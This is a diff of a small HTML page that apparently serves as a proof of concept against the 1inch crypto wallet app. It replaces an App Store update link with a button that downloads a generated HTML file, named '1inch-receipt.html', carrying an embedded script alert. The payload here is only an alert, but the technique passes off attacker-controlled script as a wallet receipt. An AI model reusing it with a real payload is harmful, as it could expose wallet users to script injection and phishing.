@@ -1,12 +1,14 @@
 <!DOCTYPE html>
 <html>
 <body>
-<a href="https://apps.apple.com/app/1inch-wallet/id-xxx">Update 1inch Wallet</a>
-<br><br>
-<button onclick="go()">Cek App Store</button>
+<button onclick="dl()">Download File</button>
 <script>
-function go(){
-  window.location.href = "https://apps.apple.com/us/app/1inch-crypto-wallet/id1489574968";
+function dl(){
+  let blob = new Blob(['<h1>Ini file dari situs jahat</h1><script>alert("Jalan di dalam 1inch?")<\/script>'], {type:'text/html'});
+  let a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = "1inch-receipt.html";
+  a.click();
 }
 </script>
 </body>
